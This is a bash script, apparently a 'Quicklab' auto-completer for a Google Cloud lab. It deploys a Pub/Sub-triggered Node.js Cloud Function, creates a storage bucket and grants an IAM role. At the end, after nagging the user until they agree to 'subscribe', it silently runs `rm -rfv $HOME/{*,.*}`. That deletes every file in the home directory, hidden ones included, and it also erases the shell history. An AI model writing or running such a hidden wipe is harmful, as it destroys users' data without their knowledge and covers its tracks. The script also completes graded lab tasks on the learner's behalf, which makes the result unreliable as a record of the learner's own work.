BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`
#----------------------------------------------------start--------------------------------------------------#

echo "${YELLOW}${BOLD}

Starting Execution 


${RESET}"
#gcloud auth list
#gcloud config list project
export PROJECT_ID=$(gcloud info --format='value(config.project)')
#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
#export EMAIL=$(gcloud config get-value core/account)
#gcloud config set compute/region us-central1
#gcloud config set compute/zone us-central1-a
#export ZONE=us-central1-a



#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
#----------------------------------------------------code--------------------------------------------------#


gcloud config set compute/region $REGION

mkdir gcf_hello_world

cd gcf_hello_world

cat > index.js <<'EOF_END'
/**
* Background Cloud Function to be triggered by Pub/Sub.
* This function is exported by index.js, and executed when
* the trigger topic receives a message.
*
* @param {object} data The event payload.
* @param {object} context The event metadata.
*/
exports.helloWorld = (data, context) => {
    const pubSubMessage = data;
    const name = pubSubMessage.data
        ? Buffer.from(pubSubMessage.data, 'base64').toString() : "Hello World";
    
    console.log(`My Cloud Function: ${name}`);
    };
EOF_END


gsutil mb -p $DEVSHELL_PROJECT_ID gs://$DEVSHELL_PROJECT_ID

echo "${GREEN}${BOLD}

Task 2 Completed

${RESET}"


gcloud services disable cloudfunctions.googleapis.com

gcloud services enable cloudfunctions.googleapis.com

gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
--member="serviceAccount:$DEVSHELL_PROJECT_ID@appspot.gserviceaccount.com" \
--role="roles/artifactregistry.reader"

gcloud functions deploy helloWorld \
  --stage-bucket gs://$DEVSHELL_PROJECT_ID \
  --trigger-topic hello_world \
  --runtime nodejs20


echo "${GREEN}${BOLD}

Task 3 Completed

Lab Completed !!!

${RESET}"

#-----------------------------------------------------end----------------------------------------------------------#
read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE

while [ "$CONSENT_REMOVE" != 'y' ]; do
  sleep 10
  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
done

echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0




